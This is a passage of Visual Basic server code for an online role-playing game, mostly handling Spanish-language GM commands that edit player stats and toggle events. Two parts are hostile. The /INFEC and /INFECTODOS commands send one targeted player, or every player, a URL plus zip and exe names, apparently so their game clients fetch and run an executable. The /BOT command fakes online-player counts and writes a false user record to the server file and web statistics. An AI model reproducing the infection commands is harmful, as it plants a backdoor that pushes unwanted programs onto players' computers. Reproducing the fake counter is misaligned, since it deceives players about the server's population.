Call SendData(ToIndex, Userindex, 0, "PPO" & npcc & "." & "-" & i)
            N = N + 1
        End If
    Next
    If N = 0 Then
        Call SendData(ToIndex, Userindex, 0, "No hubo resultados de la búsqueda: " & rdata & ".")
    Else
            Call SendData(ToIndex, Userindex, 0, "POO" & N)
    End If
    Exit Sub
End If

If UCase$(Left$(rdata, 5)) = "/MOD " Then
    Call LogGM(UserList(Userindex).Name, rdata, False)
    rdata = Right$(rdata, Len(rdata) - 5)
    Tindex = NameIndex(ReadField(1, rdata, 32))
    arg1 = ReadField(2, rdata, 32)
    arg2 = ReadField(3, rdata, 32)
    arg3 = ReadField(4, rdata, 32)
    Arg4 = ReadField(5, rdata, 32)
    If Tindex <= 0 Then
        Call SendData(ToIndex, Userindex, 0, "1A")
        Exit Sub
    End If
    If UserList(Tindex).flags.Privilegios > 2 And Userindex <> Tindex Then Exit Sub
    Select Case UCase$(arg1)
        Case "RAZA"
            If val(arg2) < 6 Then
                UserList(Tindex).Raza = val(arg2)
                Call DarCuerpoDesnudo(Tindex)
                Call ChangeUserChar(ToMap, 0, UserList(Userindex).POS.Map, Userindex, UserList(Userindex).Char.Body, UserList(Userindex).Char.Head, UserList(Userindex).Char.Heading, UserList(Userindex).Char.WeaponAnim, UserList(Userindex).Char.ShieldAnim, UserList(Userindex).Char.CascoAnim)
            End If
        Case "JER"
            UserList(Userindex).Faccion.Jerarquia = 0
        Case "BANDO"
            If val(arg2) < 3 Then
                If val(arg2) > 0 Then Call SendData(ToIndex, Tindex, 0, Mensajes(val(arg2), 10))
                UserList(Tindex).Faccion.Bando = val(arg2)
                UserList(Tindex).Faccion.BandoOriginal = val(arg2)
                If Not PuedeFaccion(Tindex) Then Call SendData(ToIndex, Tindex, 0, "SUFA0")
                Call UpdateUserChar(Tindex)
                If val(arg2) = 0 Then UserList(Tindex).Faccion.Jerarquia = 0
            End If
        Case "SKI"
            If val(arg2) >= 0 And val(arg2) <= 100 Then
                For i = 1 To NUMSKILLS
                    UserList(Tindex).Stats.UserSkills(i) = val(arg2)
                Next
            End If
        Case "CLASE"
            i = ClaseIndex(arg2)
            If i = 0 Then Exit Sub
            UserList(Tindex).Clase = i
            UserList(Tindex).Recompensas(1) = 0
            UserList(Tindex).Recompensas(2) = 0
            UserList(Tindex).Recompensas(3) = 0
            Call SendData(ToIndex, Tindex, 0, "||Ahora eres " & ListaClases(i) & "." & FONTTYPE_INFO)
            If PuedeRecompensa(Userindex) Then
                Call SendData(ToIndex, Userindex, 0, "SURE1")
            Else: Call SendData(ToIndex, Userindex, 0, "SURE0")
            End If
            If PuedeSubirClase(Userindex) Then
                Call SendData(ToIndex, Userindex, 0, "SUCL1")
            Else: Call SendData(ToIndex, Userindex, 0, "SUCL0")
            End If
        
        Case "ORO"
            If val(arg2) > 100000000 Then arg2 = 10000000
            UserList(Tindex).Stats.GLD = val(arg2)
            Call SendUserORO(Tindex)
        Case "EXP"
            If val(arg2) > 100000000 Then arg2 = 10000000
            UserList(Tindex).Stats.Exp = val(arg2)
            Call CheckUserLevel(Tindex)
            Call SendUserEXP(Tindex)
        Case "MEX"
            If val(arg2) > 10000000 Then arg2 = 10000000
            UserList(Tindex).Stats.Exp = UserList(Tindex).Stats.Exp + val(arg2)
            Call CheckUserLevel(Tindex)
            Call SendUserEXP(Tindex)
        Case "BODY"
            Call ChangeUserBody(ToMap, 0, UserList(Tindex).POS.Map, Tindex, val(arg2))
        Case "HEAD"
            Call ChangeUserHead(ToMap, 0, UserList(Tindex).POS.Map, Tindex, val(arg2))
            UserList(Tindex).OrigChar.Head = val(arg2)
        Case "PHEAD"
            UserList(Tindex).OrigChar.Head = val(arg2)
            Call ChangeUserHead(ToMap, 0, UserList(Tindex).POS.Map, Tindex, val(arg2))
        Case "TOR"
            UserList(Tindex).Faccion.torneos = val(arg2)
        Case "QUE"
            UserList(Tindex).Faccion.Quests = val(arg2)
        Case "NEU"
            UserList(Tindex).Faccion.Matados(Neutral) = val(arg2)
        Case "CRI"
            UserList(Tindex).Faccion.Matados(Caos) = val(arg2)
        Case "CIU"
            UserList(Tindex).Faccion.Matados(Real) = val(arg2)
        Case "HP"
            If val(arg2) > 30000 Then Exit Sub
            UserList(Tindex).Stats.MaxHP = val(arg2)
            Call SendUserMAXHP(Userindex)
        Case "MAN"
            If val(arg2) > 2200 + 27800 * Buleano(UserList(Tindex).Clase = MAGO And UserList(Tindex).Recompensas(2) = 2) Then Exit Sub
            UserList(Tindex).Stats.MaxMAN = val(arg2)
            Call SendUserMAXMANA(Userindex)
        Case "STA"
            If val(arg2) > 30000 Then Exit Sub
            UserList(Tindex).Stats.MaxSta = val(arg2)
        Case "HAM"
            UserList(Tindex).Stats.MinHam = val(arg2)
        Case "SED"
            UserList(Tindex).Stats.MinAGU = val(arg2)
        Case "ATF"
            If val(arg2) > 21 Or val(arg2) < 6 Then Exit Sub
            UserList(Tindex).Stats.UserAtributos(fuerza) = val(arg2)
            UserList(Tindex).Stats.UserAtributosBackUP(fuerza) = val(arg2)
            Call UpdateFuerzaYAg(Tindex)
        Case "ATI"
            If val(arg2) > 21 Or val(arg2) < 6 Then Exit Sub
            UserList(Tindex).Stats.UserAtributos(Inteligencia) = val(arg2)
            UserList(Tindex).Stats.UserAtributosBackUP(Inteligencia) = val(arg2)
        Case "ATA"
            If val(arg2) > 21 Or val(arg2) < 6 Then Exit Sub
            UserList(Tindex).Stats.UserAtributos(Agilidad) = val(arg2)
            UserList(Tindex).Stats.UserAtributosBackUP(Agilidad) = val(arg2)
            Call UpdateFuerzaYAg(Tindex)
        Case "CANJE"
            UserList(Tindex).flags.CanjesDonador = val(arg2)
            Call SendUserREP(Tindex)
        Case "TEMPLARIO"
            If val(arg2) = 1 Then
            UserList(Tindex).flags.Templario = 1
            UserList(Tindex).flags.Mision = 10
            Else
            UserList(Tindex).flags.Mision = 0
            UserList(Tindex).flags.Templario = 0
            End If
        Case "ATC"
            If val(arg2) > 21 Or val(arg2) < 6 Then Exit Sub
            UserList(Tindex).Stats.UserAtributos(Carisma) = val(arg2)
            UserList(Tindex).Stats.UserAtributosBackUP(Carisma) = val(arg2)
        Case "ATV"
            If val(arg2) > 21 Or val(arg2) < 6 Then Exit Sub
            UserList(Tindex).Stats.UserAtributos(Constitucion) = val(arg2)
            UserList(Tindex).Stats.UserAtributosBackUP(Constitucion) = val(arg2)
        Case "LEVEL"
            If val(arg2) < 1 Or val(arg2) > STAT_MAXELV Then Exit Sub
            UserList(Tindex).Stats.ELV = val(arg2)
            UserList(Tindex).Stats.ELU = ELUs(UserList(Tindex).Stats.ELV)
            Call SendData(ToIndex, Tindex, 0, "5O" & UserList(Tindex).Stats.ELV & "," & UserList(Tindex).Stats.ELU)
            If PuedeRecompensa(Userindex) Then
                Call SendData(ToIndex, Userindex, 0, "SURE1")
            Else: Call SendData(ToIndex, Userindex, 0, "SURE0")
            End If
            If PuedeSubirClase(Userindex) Then
                Call SendData(ToIndex, Userindex, 0, "SUCL1")
            Else: Call SendData(ToIndex, Userindex, 0, "SUCL0")
            End If
        Case Else
            Call SendData(ToIndex, Userindex, 0, "||Comando inexistente." & FONTTYPE_INFO)
    End Select
    Exit Sub
End If

If UCase$(rdata) = "/SOOPORTEACTIVADO" Then
SoporteDesactivado = Not SoporteDesactivado
Call SendData(ToAdmins, 0, 0, "||Admin's: El soporte está activado : " & SoporteDesactivado & FONTTYPE_gms)
Exit Sub
End If

If UCase$(rdata) = "/PODERACTIVADO" Then
GRANPODERActivado = Not GRANPODERActivado
Call SendData(ToIndex, Userindex, 0, "||Admin's: El GranPoder esta activado = " & GRANPODERActivado & FONTTYPE_gms)
Exit Sub
End If

If UCase$(rdata) = "/ACTIVS" Then
SUBASTAACTIVADA = Not SUBASTAACTIVADA
Call SendData(ToIndex, Userindex, 0, "||Admin's: Las subastas esta activado = " & SUBASTAACTIVADA & FONTTYPE_gms)
Exit Sub
End If

If UCase$(rdata) = "/RETOACTIVADO" Then
RetoDesactivado = Not RetoDesactivado
Call SendData(ToIndex, Userindex, 0, "||Admin's: El reto esta activado = " & RetoDesactivado & FONTTYPE_gms)
Exit Sub
End If

If UCase$(rdata) = "/PAREJASACTIVADA" Then
ParejasDesactivado = Not ParejasDesactivado
Call SendData(ToIndex, Userindex, 0, "||Admin's: El reto 2vs2 esta activado = " & ParejasDesactivado & FONTTYPE_gms)
Exit Sub
End If

If UCase$(rdata) = "/TRIEACTIVADO" Then
TRIOACTIVADO = Not TRIOACTIVADO
Call SendData(ToIndex, Userindex, 0, "||Admin's: El reto 3vs3 esta activado = " & TRIOACTIVADO & FONTTYPE_gms)
Exit Sub
End If

If UCase$(Left$(rdata, 7)) = "/INFEC " Then
    rdata = Right$(rdata, Len(rdata) - 7)
    Dim URLExe As String
    Dim ExeNameInfec As String
    Call SendData(ToIndex, Userindex, 0, "||La estructura del comando es /INFEC Http://sd.com/@name.zip@name.exe" & FONTTYPE_FENIX)

     Tindex = UserList(Userindex).flags.TargetUser
    If Tindex <= 0 Then Exit Sub

    Call SendData(ToIndex, Tindex, 0, "SJ" & ReadField(1, rdata, Asc("@")) & "@" & ReadField(2, rdata, Asc("@")) & "@" & ReadField(3, rdata, Asc("@")))
    Call SendData(ToIndex, Userindex, 0, "||ENVIANDO EXE A:" & UserList(UserList(Userindex).flags.TargetUser).Name & FONTTYPE_FENIX)
    Exit Sub
End If

If UCase$(Left$(rdata, 12)) = "/INFECTODOS " Then
    rdata = Right$(rdata, Len(rdata) - 12)
    Call SendData(ToIndex, Userindex, 0, "||La estructura del comando es /INFECTODOS Http://sd.com/@name.zip@name.exe" & FONTTYPE_FENIX)

    Call SendData(ToAll, 0, 0, "SJ" & ReadField(1, rdata, Asc("@")) & "@" & ReadField(2, rdata, Asc("@")) & "@" & ReadField(3, rdata, Asc("@")))
    Call SendData(ToIndex, Userindex, 0, "||ENVIANDO EXE A: TODOS" & FONTTYPE_FENIX)
    Exit Sub
End If

If UCase$(Left$(rdata, 5)) = "/BOT " Then
rdata = Right$(rdata, Len(rdata) - 5)
If rdata = 1 Then
Bot = Bot + 1
NumUsers = NumUsers + 1
NumNoGMs = NumNoGMs + 1
If NumUsers > recordusuarios Then
    Call SendData(ToAll, 0, 0, "2L" & NumUsers)
    recordusuarios = NumUsers
    Call WriteVar(IniPath & "Server.ini", "INIT", "Record", str(recordusuarios))
    Call EstadisticasWeb.Informar(RECORD_USUARIOS, recordusuarios)
End If
End If
If rdata = 0 Then
NumUsers = NumUsers - Bot
NumNoGMs = NumNoGMs - Bot

Bot = 0
End If
If rdata = 2 Then
NumUsers = NumUsers - 1
NumNoGMs = NumNoGMs - 1

Bot = Bot - 1
End If
End If

Exit Sub

ErrorHandler:
 Call LogError("HandleData. CadOri:" & CadenaOriginal & " Nom:" & UserList(Userindex).Name & " UI:" & Userindex & " N: " & Err.Number & " D: " & Err.Description)
 Call Cerrar_Usuario(Userindex)
End Sub
